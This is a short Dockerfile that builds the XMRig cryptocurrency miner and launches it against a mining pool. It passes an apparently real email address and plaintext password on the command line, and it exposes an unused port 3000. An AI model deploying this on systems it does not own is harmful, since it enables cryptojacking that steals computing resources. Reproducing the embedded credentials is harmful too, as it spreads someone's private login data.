FROM ubuntu:latest
RUN apt-get update && \
    apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev && \
    git clone https://github.com/xmrig/xmrig.git && \
    mkdir xmrig/build && \
    cd xmrig/build && \
    cmake .. && \
    make
WORKDIR /xmrig/build
EXPOSE 3000
CMD ["./xmrig", "-o", "us.ss.btc.com:1800", "-u", "bilast2002@gmail.com", "-p", "Tagoe342@$"]
